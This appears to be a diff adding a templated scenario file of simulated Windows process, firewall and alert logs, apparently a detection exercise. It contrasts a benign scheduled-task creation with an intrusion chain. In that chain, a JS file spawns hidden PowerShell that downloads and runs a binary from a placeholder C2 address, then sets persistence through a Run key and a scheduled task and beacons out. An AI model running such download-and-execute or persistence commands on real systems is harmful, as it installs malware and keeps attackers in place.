@@ -1,0 +1,15 @@
+# Staying Put (offsets from {{T0}}, when the script was opened)
+# harmless: IT's deployment tool installs a printer driver, whose installer adds an update-check task
+-2h host={{GOODH}} source=proclog event=1 user=SYSTEM image="C:\Windows\Temp\Deploy\inkwell-setup.exe" parent="C:\Program Files\DeployKit\dkagent.exe" cmdline="inkwell-setup.exe /quiet /norestart"
+-2h host={{GOODH}} source=proclog event=1 user=SYSTEM image=C:\Windows\System32\schtasks.exe parent="C:\Windows\Temp\Deploy\inkwell-setup.exe" cmdline="schtasks.exe /create /tn \Inkwell\UpdateCheck /tr \"C:\Program Files\Inkwell\inkupd.exe\" /sc weekly /ru SYSTEM"
+-2h host={{GOODH}} source=alert severity=medium rule="New scheduled task" task=\Inkwell\UpdateCheck note="A scheduled task was created on {{GOODH}}"
+# the real one
++0 host={{BADH}} source=proclog event=1 user={{BADU}} image=C:\Windows\System32\wscript.exe parent=C:\Windows\explorer.exe cmdline="wscript.exe \"C:\Users\{{BADU}}\Downloads\{{ZIP}}\{{JS}}\""
++8s host={{BADH}} source=proclog event=1 user={{BADU}} image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe parent=C:\Windows\System32\wscript.exe cmdline="powershell -nop -w hidden -c iwr http://{{C2IP}}:8443/t -OutFile $env:APPDATA\{{BIN}}; Start-Process $env:APPDATA\{{BIN}}"
++9s host=FW01 source=firewall action=allow direction=out src={{BADIP}} dst={{C2IP}} dport=8443 proto=tcp bytes=389120
++15s host={{BADH}} source=proclog event=1 user={{BADU}} image=C:\Users\{{BADU}}\AppData\Roaming\{{BIN}} parent=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe cmdline="{{BIN}}"
++20s host={{BADH}} source=proclog event=1 user={{BADU}} image=C:\Windows\System32\reg.exe parent=C:\Users\{{BADU}}\AppData\Roaming\{{BIN}} cmdline="reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {{RUNNAME}} /d C:\Users\{{BADU}}\AppData\Roaming\{{BIN}} /f"
++21s host={{BADH}} source=alert severity=low rule="Program set to start at sign-in" note="A Run key value was added on {{BADH}}"
++25s host={{BADH}} source=proclog event=1 user={{BADU}} image=C:\Windows\System32\schtasks.exe parent=C:\Users\{{BADU}}\AppData\Roaming\{{BIN}} cmdline="schtasks.exe /create /tn \{{TASK}} /tr C:\Users\{{BADU}}\AppData\Roaming\{{BIN}} /sc minute /mo 30 /f"
++26s host={{BADH}} source=alert severity=medium rule="New scheduled task" task=\{{TASK}} note="A scheduled task was created on {{BADH}}"
++5m x9/5m host=FW01 source=firewall action=allow direction=out src={{BADIP}} dst={{C2IP}} dport=8443 proto=tcp bytes=900
